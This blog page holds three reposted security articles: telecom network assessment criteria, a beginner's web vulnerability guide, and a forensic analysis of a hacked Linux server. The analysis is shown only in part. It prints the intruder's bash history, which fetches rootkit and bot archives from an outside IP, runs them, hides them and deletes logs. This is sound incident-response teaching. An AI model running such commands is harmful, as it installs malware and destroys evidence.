        <span>Posted on<time datetime="2014-02-02T01:54:38.000Z"> <a href="/2014/02/02/2014-02-02-安全--电信数据网安全评估准则的研究/">feb. 2 2014</a></time></span>      
    </header>
    
    
    <div class="entry">
      
        <h1 id="-">电信数据网安全评估准则的研究</h1>
<p>电信数据网安全评估准则的研究</p>
<p>原文链接：<a href="http://www.securitycn.net/html/research/service/3205.html" target="_blank"><a href="http://www.securitycn.net/html/research/service/3205.html">http://www.securitycn.net/html/research/service/3205.html</a></a></p>
<p>摘要　提出电信数据网的安全评估框架，重点讨论了电信数据网安全评估准则、电信数据网安全等级划分原理、电信数据网安全评估过程、电信数据网安全评估工具。最后，指出了电信数据网安全评估发展趋势。</p>
<p>电信数据网作为国民经济的基础设施，与国民经济各领域的联系日益紧密，网络安全问题对整个国民经济信息化进程有着举足轻重的战略作用。电信数据网安全作为国家信息安全的一个重要组成部分，要与国家信息安全总体要求和总体部署保持一致，要坚持积极防御、综合防范的方针，提高网络防护能力和风险识别能力，加强对电信网的安全评估工作。</p>
<p>近年来，中国电信网络环境更加复杂，网络安全威胁更加严重，病毒、黑客、垃圾邮件等频繁困扰着企业和用户。网络安全对今天的电信运营商来说已是重中之重。随着电信网络从原来的信息传输通道走向今天的多元化网络平台，再加上运营商本身竞争的加大以及客户对服务质量的不断提升，电信网络的安全、可靠成了运营商必须面对的问题。因此，电信网络运营商要保证电信网络的正常运行，就必须对其进行全面的安全评估。电信系统在进行网络安全设备选型、网络安全需求分析、网络建设、网络改造、应用系统试运行、内网与外网互联、与第三方业务伙伴进行网上业务数据传输、电子政务等业务之前，进行安全评估会帮助电信运营商在一个安全的框架下进行组织活动。通过安全评估来识别风险大小，通过制定信息安全方针，采取适当的控制目标与控制方式对风险进行控制，使风险被避免、转移或降至一个可被接受的水平。</p>
<p>本文就电信数据网安全评估的若干关键问题，包括电信数据网安全评估准则、电信数据网风险分析方法、电信数据网安全等级划分原理、电信数据网安全评估过程、电信数据网安全评估工具等，进行了探讨。</p>
<p>1、TDN安全评估体系</p>
<p>为了使评估结果达到更好的可比性，评估应在权威的评估体制内执行。</p>
<p>其中，电信数据网安全评估认证中心是经电信主管部门授权，代表国家对电信数据网进行安全评估认证的管理机构。电信数据网安全评估认证中心根据国家授权，依据电信数据网安全评估准则，结合相关的国家质量认证的法律、法规点开展评估认证工作。</p>
<p>授权评估机构是电信数据网安全评估认证中心根据业务发展和管理需要而授权成立的、具有评估能力的独立机构。</p>
<p>最终的评估结果应进入认证过程，该过程是一个针对评估结果的独立检查，并为评估发起者生成最终的证书或正式批准文件，如图1所示。</p>
<p><img src="http://www.securitycn.net/img/uploadimg/20070713/094010189.jpg" alt="TDN安全评估体系"></p>
<p>图1  TDN安全评估体系</p>
<p>2、电信数据网安全评估准则</p>
<p>电信数据网安全评估准则是GB/T 18336在电信领域的扩展和补充。它以信息技术安全性评估准则为基础，吸取ITU X.800系列的有关安全的建议，通过对BS7799、SSE-CMM进行结合、扩展和补充，形成对电信数据网安全性评估的评估准则。</p>
<p>2.1　电信数据网的关键资产</p>
<p>资产是所要保护的数据网对象，所有威胁都必须针对资产才能产生影响，只有通过资产载体才会影响数据网使命的完成与实现。资产可以分为三大类：物理资产、信息资产和服务资产。物理资产的安全审查着重于保护那些对持续运转非常关键的设备（如，路由器、交换机，数据存储设备和主机等）。数据网络中传统的内部服务资产包括交换系统、运营支持系统、网络管理系统和辅助的支持系统。近来，还包括了信令处理系统及其部件、数据库服务器设备、智能网络管理、支撑网设备等。外部服务资产包括远程智能维护和测试、服务器托管或租赁、网络广告服务、各种业务的网络接入和电信企业一些无形资产等。信息资产通常是最有价值的资产，在数据网运营过程中产生的同数据网本身相关的有价值的信息以及数据网所存储、处理和传输的各种相关的业务、管理和维护等信息，包括知识资产、客户资料、业务信息流和管理信息等。</p>
<p>2.2　电信数据网的安全径纬度</p>
<p>对数据网安全性的评估从安全功能、安全域和安全活动三个角度构成一个三维结构，如图2所示。</p>
<p><img src="http://www.securitycn.net/img/uploadimg/20070713/094132324.jpg" alt="TDN安全评估准则的三维结构"></p>
<p>图2　TDN安全评估准则的三维结构</p>
<p>第一维（x轴）是安全功能，给出了被保护对象的基本安全功能需求，包括身份认证、访问控制、数据保性、数据完整性、不可抵赖、可靠性、可用性和安全审计。</p>
<p>访问控制，保证只有授权的人员和设备才允许访问网络元素、存储的信息、信息流、业务和应用；身份认证，保证参与通信的实体声称的身份的有效性，并保证实体不企图伪造或以非授权的方式回放前面的通信流；不可抵赖，不可抵赖性是防止用户事后否认其实施了某一行为的能力。这些行为包括制造、发源、收到和发送内容，例如发送或接收消息、发起或接受呼叫、参加语音和视频会议等等。不可抵赖性要求提供对数据发送或接收的不可伪造的证明，防止发送者否认一个正确的消息或接收者否认接收。网络可提供下面两种或其中之一形式：数据接收者得到数据来源的证明以避免发送者不诚实地否认其发送了数据或其内容；或发送者得到数据传送的证明以免接收者事后否认接收了数据或其内容。数据保密性，保证数据内容不被非授权的实体理解；可靠性，保证信息只在授权的端点之间流动，而不被拦截或转移；数据完整性，保证数据的正确性或精确性，非授权活动能够被检测；可用性，保证对网络元素、存储的信息、信息流、业务和应用的授权访问不被否决；安全审计，保证即使通过对网络活动进行观察也不能获得有用的信息，这些信息包括地址位置、IP地址等。</p>
<p>第二维（y轴）是安全域，给出了数据网的三大安全域，包括核心层、汇接层和接入层。每个安全域的具体功能如下：</p>
<p>（1）核心层区域：主要放置核心交换设备，用于汇接数据流连接骨干网或进行本局域网不同区域之间有条件的信息交互；</p>
<p>（2）汇接层区域：主要放置汇接设备和交换设备，用于汇接数据流连接核心层网络或本局域网内的有条件信息交互；</p>
<p>（3）接入层区域：主要放置各种接入设备及其交换设备，用于汇接数据流连接汇接层网络或本局域网内的有条件信息交互；</p>
<p>第三维（z轴）是安全平台，从管理、控制、用户三个角度去考虑系统的安全问题。</p>
<p>安全活动分别讨论与网络管理活动、网络控制或信令活动和终端用户活动相关的特定安全需求。在安全管理中详细讨论的管理层面关注运行、管理、维护和提供（OAM&amp;P）服务活动，如向某个用户或网络提供服务。控制层面与独立于网络所用的媒介和技术的端到端通信的建立（和修改）方面的信令有关。终端用户层面讨论用户访问和使用网络的安全，也包括保护用户数据流。</p>
<p>3、电信数据网等级划分原理</p>
<p>由于数据网本身的复杂性：覆盖地域广阔、结构复杂、涉及的行政部门和人员众多等，其涉及的安全问题从物理安全、网络安全、系统安全一直到应用安全、数据安全、安全管理、安全组织等等。凡是涉及到影响正常运行的和业务连续性的都可以认为是电信数据网安全问题。同时电信数据网由于不同地区、不同级别，不同地域和行政隶属层次的安全要求属性和强度存在较大的差异性。不同的电信数据网系统有着不同的安全需求，所以必须从实际出发，综合平衡安全成本和风险，优化电信数据网安全资源的配置，保护重点。为了达到这一目的，应该进行电信数据网的安全等级划分，以此来保证最有效的进行安全评估。</p>
<p>针对电信数据网的特点，以评估对象框架为经，以安全对策框架为纬，对评估对象逐个进行威胁分析，从而形成电信数据网安全等级划分体系（见图3）。</p>
<p><img src="http://www.securitycn.net/img/uploadimg/20070713/094237165.jpg" alt="等级化安全评估体系设计"></p>
<p>图3　等级化安全评估体系设计</p>
<p>具体从三个方面进行等级划分：</p>
<p>一是评估对象的等级化；通过资产识别和复制，建立评估对象框架，把评估对象分级。</p>
<p>二是安全保护策略的等级化设计对策框架，这本身就是等级化的一种手段。</p>
<p>三是威胁等级化；分析系统将遭遇的威胁，通过综合考虑威胁的强度和概率，将威胁也划分为若干个等级。</p>
<p>由于电信数据网结构的复杂性和庞大性，电信数据网中的设备数量和类型众多，而安全性评估过程是一个复杂和繁复的过程我们不可能对所有的设备利用该模型进行评估。因此可以利用上面提出的模型对电信数据网中的设备划分出等级，根据不同级别的安全需求对不同级别的设备进行评估。</p>
<p>在电信数据网安全评估的过程中，由于决定电信数据网评估对象价值的因素众多，其各个因素的取值又多具有模糊性，可以采用多因素模糊综合评判模型来对其进行分析。</p>
<p>4、电信数据网评估过程</p>
<p>电信数据网评估过程就是在评估标准的指导下，综合利用相关等级划分原理、评估工具，针对电信数据网展开全方位的评估工作的完整历程。</p>
<p>4.1　评估的角色</p>
<p>电信数据网的安全评估是一个复杂的过程，需要各种人员的参与。具体包括：评估发起者、评估者、电信运营商、电信设备制造商和软件提供商、监督和认证机构等。评估者指具有资质的TDN评估企业或者政府机构。评估发起者通常是电信运营商或者其主管部门。监督和认证机构指由权威的电信数据网认证机构来担任。</p>
<p>4.2　评估的过程简介</p>
<p>基于TDN安全评估准则的电信数据网评估过程可以分为三个阶段：</p>
<p>第一阶段：文档准备。该阶段用于准备需要的评估文档，主要包括电信数据网的安全目标（TDN ST）和待评估的电信数据网的相关文档。只有这两个文档完成后，评估过程才能继续。</p>
<p>第二阶段：执行评估。该阶段的主要内容是根据第一阶段的文档，按照电信数据网安全评估方法（TDNEM）对TDN进行评估，最后得出TDN的评估技术报告（ETR）以及风险分析报告（RAR）。</p>
<p>第三阶段：结论及认证。在该阶段，评估者把评估技术报告提交给认证者。经认证者批准后形成认证报告（VR）。风险分析报告有助于电信运营商改编组织安全策略减少安全风险，保护电信数据网的资产。</p>
<p>每个阶段的不同参与者分别执行不同的任务，共同完成电信数据网安全评估的全过程。</p>
<p>5、分布式评估工具系统的设计</p>
<p>电信数据网具有分布式的结构，包括多个节点，每个节点可能成百上千种设备，并且分布在不同的地理位置上。评估过程相当复杂，需要采集大量的数据，系统需要保留所有采集数据以备日后查询、核对、检验、分析，而且需要评估人员具有丰富的评估经验。评估过程需要评估发起者、评估者、电信设备和软件提供商、认证机构、被评估机构等各种人员的参与和配合。因此，开发一个适合于分布式环境的电信数据网安全评估辅助工具系统就显得至关重要（见图4）。这对于减少电信数据网评估的时间、降低评估的复杂性、节省资源、提高评估结果的客观性和准确性具有重大的意义。</p>
<p><img src="http://www.securitycn.net/img/uploadimg/20070713/094355632.jpg" alt="分布式评估工具系统的网络拓扑图"></p>
<p>图4　分布式评估工具系统的网络拓扑图</p>
<p>系统的实现可以基于浏览器/HTTP服务器/业务服务器/数据库服务器的四层模式。业务服务器运行的EJB或者JSP组件，在Eclipse环境下 用Java语言设计实现。这些组件包括安全评估模块、风险分析模块、等级保护模块、标准查询模块和报表生成模块，是本系统的核心部分。业务服务器和数据库 服务器之间的通信接口为JDBC。需要参与到评估过程中的各个角色如评估人员、电信网运营人员、评估管理机构以及电信设备生产者等可以通过浏览器将与评估 相关的记录输入到系统中。系统将这些信息自动保存到MySQL数据库中。</p>
<p>在数据库系统中有包括三个子系统：基本数据系统，评估数据系统，漏洞数据库。基本数据系统为电信网安全评估提供必需的基础理论。基本系统由评估标准 库和评估规程库组成。评估数据系统主要包括风险分析数据库和等级化保护数据库。在对电信数据网安全域划分的基础上，对电信数据网的关键资产建立基于 MySQL的良好扩充性的漏洞数据库。完成系统漏洞相关数据，包括系统漏洞特征描述、应对措施（主要是系统补要程序）、系统安全配置策略等的存储。漏洞库 是系统安全隐患分析的核心，集中了常见的各类系统漏洞特征和相应的应对措施、网络系统当前的脆弱性状态，以及和系统漏洞分析应对措施相关的系统安全配置策 略。为了使系统具有较强的开放性，我们为每一条漏洞都提供了CVE编号。CVE是个行业标准，为每个漏洞和暴露确定了惟一的名称和标准化的描述，可以成评 价相应入侵检测和漏洞扫描等工具产品和数据库的基准。这样，如果在一个漏洞报告中指明一个漏洞有CVE名称，就可以快速地在任何其他CVE兼容的数据库中 找到相应的对应信息。</p>
<p>6、结论</p>
<p>为了解决电信数据网的安全问题，需要建立一套完整的评估认证体系。本文论述的以CC为基础的电信数据网安全评估体系及关键技术。</p>
<p>基于CC的电信数据网安全评估发展趋势：</p>
<p>本文研究了对已经存在的电信数据网的安全评估方案，而对于计划建设和正在建设的电信数据网安全评估过程及方法还有待讨论。</p>
<p>电信数据网硬件设备和软件的保护轮廓PP的制定。如果没有一定数量的PP，基于CC的电信数据网安全评估将成为空话。</p>
<p>具有一定智能的分布式评估工具系统的开发。地动化的评估工具有助于缩短评估的周期、减少评估的代价、保证评估结果的客观性。</p>

      
    </div>
    
    
      
    
    
        <footer id="post-meta">
        <span class="categories">Posted in<span class="breadcrumb fa fa-folder"><li><a href="/categories/安全/">安全</a></li></span></span> | <span class="tags">Tagged <a href="/tags/安全/" class="label label-primary">安全</a></span> | <span class="time">recent updated:<time title="2014-03-29 20:53:42"datetime="2014-03-29 20:53:42"> mar. 29 2014</time></span> | <span class="comment-link">
<a href="http://itsolife.com/2014/02/02/2014-02-02-安全--电信数据网安全评估准则的研究/#comments" class="ds-thread-count comment-link" data-thread-key="2014-02-02-安全--电信数据网安全评估准则的研究" data-count-type="comments">暂无评论</a></span>
        </footer>
    
    <div class="clearfix"></div>
  </div>
</div>
</article>



  <article>
<div id="post" class="post well">
  <div class="post-content">
    <header class="well-sm">
      <i class="fa icon fa-5x pull-left"></i>
      <h1 class="title"><a href="/2014/02/02/2014-02-02-安全--成为一个破坏者的第一部分：Web安全/">成为一个破坏者的第一部分：Web安全</a></h1>
      
        <span>Posted on<time datetime="2014-02-02T01:54:38.000Z"> <a href="/2014/02/02/2014-02-02-安全--成为一个破坏者的第一部分：Web安全/">feb. 2 2014</a></time></span>      
    </header>
    
    
    <div class="entry">
      
        <h1 id="-web-">成为一个破坏者的第一部分：Web安全</h1>
<h2 id="-web-">成为一个破坏者的第一部分：Web安全</h2>
<p>在我看来，没有什么比挑战安全领域更有挑战性。当强大的软件一个接一个接踵而至，你所需要做的就是破解他，这好比是一场围棋游戏。当你每下一步棋，你的对手——软件的设计者和开发者，通过代理——作出相应的回应。正如你所知的，赢的途径只有一条，你将会利用大脑的每一部分，找出链条中的弱点。</p>
<p>当我找到正确的击破点，并且整个系统崩溃的时候，我觉得我找到了自己。你也会的。</p>
<h2 id="-">序言</h2>
<p>这篇博客的目的并不是要全面地去讨论；实际上，它是相反的。我的目的是教会你关于安全上足够的东西——尤其是软件安全——你可以自己去深入学习其他东西。为了轻松去学习，我会在通篇博客中放置各种资源的链接；在这里，Google也是你最好的朋友，它在这个主题上有上百万的资源。</p>
<p>在你读了正文部分后，你可以跳去其他的你认为合适的任何部分（包括其他由之而来的博客），因为它们是独立编写的。</p>
<p>这篇博客主要关注Web安全。对于底层安全和加密的博客即将发布。</p>
<h2 id="-">正文</h2>
<h3 id="-">预备知识</h3>
<p>要想出一些安全领域的预备知识是比较难的，这知识由于这领域的涉及面太广。然而，下面的东西还是必需要有的：</p>
<ul>
<li>熟悉一种或多种编程语言（没有人会让你用你不会的语言来写小说）。如果你感兴趣的是底层的安全，那就必需要会一种底层语言；C是最好的。</li>
<li><p>了解计算机的原理和它是怎样工作的。不要求你能够用铁罐和线组装层一个CPU，但你要能够解析：</p>
</li>
<li><p>(Web) HTML是怎样转换的以及JS是怎样在页面上交互的。</p>
</li>
<li><p>(Web) HTTP协议是怎样工作的。</p>
</li>
<li><p>实际上，写一个代理。你最后就做了很多这些东西。（这实际上是足够重要的，某天我可能会写一个关于这个的博客。）</p>
</li>
<li>(底层) 指针是怎样工作的，栈是怎样布局的，堆是什么东西，以及（附加要点）系统调用是怎样工作的。</li>
</ul>
<p>在需要的地方，我会讲下更多的特殊预备知识。</p>
<h2 id="-">心态</h2>
<p>在我继续之前，我需要触摸一下破坏者的心态。你的目标并不是保存用户交互，或是程序的数据流。你的目标是回答一个简单的问题：在什么情况下，程序无法完成其既定目标？</p>
<p>或许对此最好的例子就是网络应用中存在的跨站脚本攻击；攻击者可以在页面之外输出未经过滤的内容，允许其在页面中插入任意的HTML代码。正常的数据流存留——从用户到页面的数据——但由于数据中含有HTML代码，页面被完全损坏了》</p>
<p>预期和实际行为的区别在于你对所有可能性的探寻——无论是下节中描述的标准bug，还是你正测试的问题域的特有逻辑缺陷。</p>
<h2 id="-">网络安全</h2>
<h3 id="-">必用工具</h3>
<p>下面是一个你的兵器库中必备工具的列表。其中一些是很多工具的集合——除非特别提及，它们大多是可以相互替换的。</p>
<ul>
<li><p>HTTP(S) 代理——你会经常用到，它将允许你在传输过程中分行和修改数据。</p>
</li>
<li><p><a href="http://portswigger.net/burp/proxy.html" target="_blank">Burp 代理</a>——除非有理由，否则你值得拥有。这是业内标准，学习曲线很浅。</p>
</li>
<li><a href="http://mitmproxy.org/" target="_blank">mitmproxy</a></li>
<li><a href="http://www.charlesproxy.com/" target="_blank">Charles 代理</a> (界面非常糟糕，只在对 <a href="http://en.wikipedia.org/wiki/Action_Message_Format" target="_blank">AMF</a> 时使用它。)</li>
<li><a href="https://www.owasp.org/index.php/Category:OWASP_DirBuster_Project" target="_blank">DirBuster</a> —— 对查找“隐藏”的文件/目录很有用。</li>
<li><a href="https://github.com/GDSSecurity/PadBuster" target="_blank">PadBuster</a> —— 侦查填充溢出漏洞很有用。</li>
<li><a href="http://python.org/" target="_blank">Python</a> or <a href="http://ruby-lang.org/" target="_blank">Ruby</a> —— 对任务进行自动化处理。</li>
</ul>
<h2 id="-"> </h2>
<h2 id="-xss-">跨站脚本漏洞（XSS）</h2>
<p>跨站脚本是网站最常见的漏洞。这个概念很简单：攻击者的数据发送到页面没有经过合适的过滤，使攻击者的代码可以在页面上下文内执行。</p>
<p>反射XSS（Reflected XSS）是攻击者的注入（比如查询字符串）后页面直接显示攻击结果。这是最常用的也是使用最多的CSRF攻击方式（见下一节）。他们可以被许多现代Web框架默认防御掉。</p>
<p>存储XSS（Stored XSS）是攻击者把数据注入到存储单元中——一般是数据库——在此后的某个时段无过滤的输出结果。这种XSS没有反射XSS普遍，但是杀伤力更大，因为很容易影响到大量用户。和反射XSS一样，许多框架默认也可以防御。</p>
<p>基于DOM的XSS（DOM-based XSS）是注入到JavaScript中，浏览器无过滤的输出结果。这种XSS相当罕见但是无法被框架防御。因而相对别的XSS形式，基于DOM的XSS在逐渐增多。</p>
<p>在所有情况下，他们都可以被输出前的数据过滤阻止，但重要的是正确地编码数据。例如HTML编码没办法防御数据中script标签中的代码；这样JS字符串也需要编码。</p>
<ul>
<li><a href="https://www.owasp.org/index.php/Top_10_2010-A2-Cross-Site_Scripting_%28XSS%29" target="_blank">OWASP</a> (The Open Web Application Security Project)</li>
<li><a href="http://en.wikipedia.org/wiki/Cross-site_scripting" target="_blank">Wikipedia</a><h2 id="-csrf-">跨站请求伪造（CSRF）</h2>
</li>
</ul>
<p>CSRF攻击很简单，但很常见很有效。基本的原理是攻击者把受害者引导（重定向或Email中的链接）到目标网站上。这个页面带有执行请求的数据，比如银行事务。从后端看，就像是用户自己做的一个正常的请求。</p>
<p>防御CSRF的方法是在表单数据中加入随机令牌（token）。每次请求后端都验证token，确定用户会话token和表单数据token相同，否则拒绝请求。尽管主流框架都内置CSRF防御，但CSRF仍然是常见的攻击方式。</p>
<ul>
<li><a href="https://www.owasp.org/index.php/Top_10_2010-A5" target="_blank">OWASP</a></li>
<li><a href="http://en.wikipedia.org/wiki/Cross-site_request_forgery" target="_blank">Wikipedia</a></li>
</ul>
<h2 id="sql-">SQL注入</h2>
<p>SQL注入是目前Web应用中最著名最普遍的漏洞。它是利用SQL查询时没有合适的转义，攻击者可以阻断原有查询并添加自己的查询代码。</p>
<p>根据代码和数据库配置情况，他可以造成从较大（盲注入查询数据）到在灾难级（任意代码执行，文件访问权限和数据破坏等）的破坏。主流的框架使用自带的ORM防御SQL注入：所有都用预备参数查询。当原生查询和攻击数据混合时，必须进行合适的转义。</p>
<ul>
<li><a href="https://www.owasp.org/index.php/Top_10_2010-A1" target="_blank">OWASP</a></li>
<li><a href="http://en.wikipedia.org/wiki/SQL_injection" target="_blank">Wikipedia</a><h2 id="shell-">Shell注入</h2>
</li>
</ul>
<p>Shell注入非常罕见，但非常严重。如果用户无过滤的传递shell命令，有可能——通过引号，分号或其他符号——同时执行其他命令。</p>
<p>使用用户数据调用shell命令最好把命令打包数组里（这是自然免疫）提供给程序，而且对原始命令字符串拼接的命令恰当的转义。</p>
<ul>
<li><a href="http://en.wikipedia.org/wiki/Code_injection#Shell_injection" target="_blank">Wikipedia</a></li>
</ul>
<h2 id="-">目录遍历</h2>
<p>目录遍历通常用于将用户信息直接指向系统中文件路径的情形。这样，如果没有适当的过滤，可能插入一个 “..” 目录的引用，就可以查阅目录树。它可能允许任意的读/写/删除文件操作，这是一个非常常见的漏洞。</p>
<ul>
<li><a href="http://en.wikipedia.org/wiki/Directory_traversal_attack" target="_blank">Wikipedia</a><h2 id="-">授权不足</h2>
</li>
</ul>
<p>授权不足 指的是某些功能或数据没有设定访问控制的情形。有个例子，一个正确设定访问控制的管理控制台有一个对有管理员身份需求的功能的链接，而此功能本身并未正确的设置访问控制。</p>
<p>这通常用于强制浏览攻击，以非法控制数据。</p>
<ul>
<li><a href="https://www.owasp.org/index.php/Top_10_2010-A8" target="_blank">OWASP</a></li>
</ul>
<h2 id="-">强制浏览</h2>
<p>强制浏览——又叫 直接对象引用——是一种嫁给你实现细节以可修改的方式暴露给用户的漏洞类型。通常，它的形式是在请求中出现一个可以很容易修改的 id 参数，使攻击者可以轻易的列举出可能的标识符，以访问和修改数据。</p>
<ul>
<li><a href="https://www.owasp.org/index.php/Top_10_2010-A4" target="_blank">OWASP</a></li>
</ul>
<h2 id="-">其它</h2>
<p>上面的话题是一个很好的开始，它们是我在测试现实世界中的应用时，<em>不断</em>出现的东西。当然，我给出的列表并不全面，所以下面列出了一些其它的主题，你应该读一下：</p>
<ul>
<li><a href="https://www.owasp.org/index.php/XML_External_Entity_%28XXE%29_Processing" target="_blank">XML外部实体注入 (XXE)</a></li>
<li><a href="http://en.wikipedia.org/wiki/Session_fixation" target="_blank">Session 固化</a></li>
<li><a href="https://www.owasp.org/index.php/Top_10_2010-A10-Unvalidated_Redirects_and_Forwards" target="_blank">无校验重定向</a><h2 id="-">联系</h2>
</li>
</ul>
<p>处于对 <a href="http://www.overthewire.org/wargames/natas/" target="_blank">Natas</a> 网络安全的兴趣，我在近期指点了很多人。在这网络游戏中，你将使用到很多我在本文中提到过得技术，还有一些技术我并没有提及。它们也很有趣。</p>
<p>其它优质资源：</p>
<ul>
<li><a href="https://github.com/stripe-ctf/stripe-ctf-2.0/" target="_blank">Stripe CTF 2.0</a></li>
<li>OWASP&#39;s <a href="https://www.owasp.org/index.php/Category:OWASP_WebGoat_Project" target="_blank">WebGoat</a> and <a href="https://www.owasp.org/index.php/Category:OWASP_Vicnum_Project" target="_blank">Vicnum</a></li>
<li>Maven&#39;s <a href="http://www.mavensecurity.com/web_security_dojo/" target="_blank">Web Security Dojo</a></li>
<li><a href="http://peruggia.sourceforge.net/" target="_blank">Peruggia</a></li>
</ul>
<h2 id="-">深入学习</h2>
<p>希望完成练习并深入到实际应用中去？现在，很多公司都有 Bug 奖励系统，这样你不仅可以合法的测试它们的软件，同时还可以由自己发现的 Bug 获取报酬。你可以在 <a href="http://blog.bugcrowd.com/list-of-active-bug-bounty-programs/" target="_blank">这里</a>找到这些软件的列表。
Happy hacking,</p>
<p>时间:2013-03-19 08:47来源:开源中国社区 作者:oschina责任编辑:陈华才</p>
<p>来源： <a href="[http://www.linuxeden.com/html/news/20130319/137120.html](http://www.linuxeden.com/html/news/20130319/137120.html)">[http://www.linuxeden.com/html/news/20130319/137120.html](http://www.linuxeden.com/html/news/20130319/137120.html)</a></p>

      
    </div>
    
    
      
    
    
        <footer id="post-meta">
        <span class="categories">Posted in<span class="breadcrumb fa fa-folder"><li><a href="/categories/安全/">安全</a></li></span></span> | <span class="tags">Tagged <a href="/tags/安全/" class="label label-primary">安全</a></span> | <span class="time">recent updated:<time title="2014-03-07 09:54:38"datetime="2014-03-07 09:54:38"> mar. 7 2014</time></span> | <span class="comment-link">
<a href="http://itsolife.com/2014/02/02/2014-02-02-安全--成为一个破坏者的第一部分：Web安全/#comments" class="ds-thread-count comment-link" data-thread-key="2014-02-02-安全--成为一个破坏者的第一部分：Web安全" data-count-type="comments">暂无评论</a></span>
        </footer>
    
    <div class="clearfix"></div>
  </div>
</div>
</article>



  <article>
<div id="post" class="post well">
  <div class="post-content">
    <header class="well-sm">
      <i class="fa icon fa-5x pull-left"></i>
      <h1 class="title"><a href="/2014/02/02/2014-02-02-安全--一次服务器被入侵后的分析/">一次服务器被入侵后的分析</a></h1>
      
        <span>Posted on<time datetime="2014-02-02T01:54:38.000Z"> <a href="/2014/02/02/2014-02-02-安全--一次服务器被入侵后的分析/">feb. 2 2014</a></time></span>      
    </header>
    
    
    <div class="entry">
      
        <h3 id="-">一次服务器被入侵后的分析</h3>
<p><a href=""></a><a href="http://www.freebuf.com/author/litdg" title="由 litdg 发布">litdg</a> @ <a href="http://www.freebuf.com/category/articles/system" title="查看 系统安全 中的全部文章" target="_blank">系统安全</a> 2013-09-11 </p>
<p><strong>最近有个朋友让我去帮他看一下他的linux服务器.说是apache启动不了,有很多诡异的情况.后来证明绝不是apache启动不了这么简单.</strong></p>
<p>登上服务器之后随便看了下,最先引起我注意的是”ls”命令的输出:</p>
<p>lars@server1:~$ ls ls: invalid option -- h Try `ls --help&#39; for more information.</p>
<p>为什么”ls”默认加了”-h”参数呢?我用”alias”命令看了一下,然后取消了这个别名之后”ls”就工作正常了.</p>
<p>lars@server1:~$ alias ls alias ls=&#39;ls -sh --color=auto&#39; lars@server1:~$ unalias ls lars@server1:~$ ls backup lars@server1:~$</p>
<p>虽然很奇怪,不过我的首要任务是先把apache启动起来,等过会再仔细研究这个问题.</p>
<p>lars@server1:~$ sudo /etc/init.d/apache2 start Password: /* Starting apache 2.0 web server... (2): apache2: could not open error log file /var/log/apache2/error.log. Unable to open logs ...fail!</p>
<p>纳尼?赶紧去”/var/log/”目录一看,果然”apache2/”文件夹不见了.而且这个目录下其他的文件夹,比如”mysql/”,”samba/”也都不见了.一定是哪里出错了.会不会是我朋友不小心删掉了呢,他跟我说绝对没有.然后我用root登录进去准备修复日志丢失的问题.</p>
<p>lars@server1:~$ sudo -i Password: root@server1:~/# ls ls: unrecognized prefix: do ls: unparsable value for LS_COLORS environment variable total 44 4 . 4 .bashrc 4 .ssh 4 .. 4 .lesshst 8 .viminfo 8 .bash_history 4 .profile 4 .vimrc</p>
<p>很不幸的发现,”ls”又出问题了.同样,用”alias”命令:</p>
<p>root@server1:~/# alias ls alias ls=&#39;ls -sa --color=auto&#39; root@server1:~/# unalias ls root@server1:~/# ls root@server1:~/#</p>
<p>这个时候,我才意识到问题的严重性.”ls”奇怪的举动和”/var/log/”大量日志被删除让我怀疑服务器是否被入侵了.当我看到root目录下的”.bash_history”时,就已经可以确定被入侵了.</p>
<p>root@server1:~/# cat -n .bash_history ... 340 w 341 cd /var 342 wget <a href="http://83.19.148.250/~matys/pliki/shv5.tar.gz" target="_blank">http://83.19.148.250/~matys/pliki/shv5.tar.gz</a> 343 tar -zxf shv5.tar.gz 344 rm -rf shv5.tar.gz 345 mv shv5 .x 346 cd .x 347 ./setup zibi.joe.149 54098 348 passwd 349 passwd 350 ps aux 351 crontab -l 352 cat /etc/issue 353 cat /etc/passwd 354 w 355 who 356 cd /usr/lib/libsh 357 ls 358 hide + 359 chmod +x hide 360 hide + 361 ./hide + 362 cd /var/.x 363 mkdir psotnic 364 cd psotnic 365 wget <a href="http://83.19.148.250/~matys/pliki/psotnic0.2.5.tar.gz" target="_blank">http://83.19.148.250/~matys/pliki/psotnic0.2.5.tar.gz</a> 366 tar -zxf psotnic0.2.5.tar.gz 367 rm -rf psotnic0.2.5.tar.gz 368 ls 369 mv psotnic-0.2.5-linux-static-ipv6 synscan 370 ./synscan 371 vi conf 372 vi conf1 373 mv synscan smbd 374 smbd -c conf 375 ls 376 ps aux 377 ls 378 ./smbd -c conf 379 ./smbd -c conf1 380 ./smbd conf 381 ./smbd conf1 382 ./smbd -a conf conf1 383 rm -rf conf.dec 384 rm -rf conf1.dec 385 cd /usr/lib/libsh 386 ./hide + 387 exit ... 425 ssh ftp@62.101.251.166 426 w 427 ls 428 ls 429 cd /var/.x 430 ls 431 cd psotnic/ 432 ls 433 rm -rf /var/log//* 434 exit 435 ls 436 cd /var/.x/psotnic/ 437 ls 438 vi conf2 439 ./smbd -c conf2 440 ./smbd conf2 441 ./smbd -a conf conf1 conf2 442 rm -rf conf2.dec 443 cd .. 444 ls 445 cd /usr/lib/libsh 446 hide + 447 ./hide + 448 exit 449 ps aux 450 cd /var/.x 451 ls 452 ls 453 cd psotnic/ 454 ls 455 cat pid.MastaH 456 kill -9 2030 457 ./synscan -a conf conf1 458 ./smbd -a conf conf1 459 cd /usr/lib/libsh 460 ./hide +</p>
<p>Woht!这个系统已经被入侵了.这实在是令人激动的一件事情,不过很显然,我的朋友不这么想.这个入侵者犯了一个很基本的错误,没有清除”.bash_history”文件.所以他/她可能在其他的地方也留下了一些蛛丝马迹.接下来就是详细的分析一下这次入侵.</p>
<p>通过bash history我们得到了大量的信息.先来看一下”/var/.x”下面隐藏了什么和命令”setup zibi.joe.149 54098″的作用吧.</p>
<p>root@server1:/var/.x/# file setup setup: Bourne-Again shell script text executable root@server1:/var/.x/# wc -l setup 825 setup root@server1:/var/.x/# head -17 setup /#!/bin/bash /# /# shv5-internal-release /# by: PinT[x] April/2003 /# /# greetz to: /# /# [/<em>] SH-members: BeSo_M, grass^, toolman, nobody, niceboy, armando99 /# C00L|0, GolDenLord, Spike, zion ... /# [/</em>] Alba-Hack : 2Cool, heka, TheMind, ex-THG members ... /# [/<em>] SH-friends: mave, AlexTG, Cat|x, klex, JinkS ... /# [/</em>] tC-members: eksol, termid, hex, keyhook, maher, tripod etc.. /# [/<em>] And all others who diserve to be here but i forgot /# [/</em>] them at the moment ! /# /# PRIVATE ! DO NOT DISTRIBUTE /<em>censored/</em>EZ !</p>
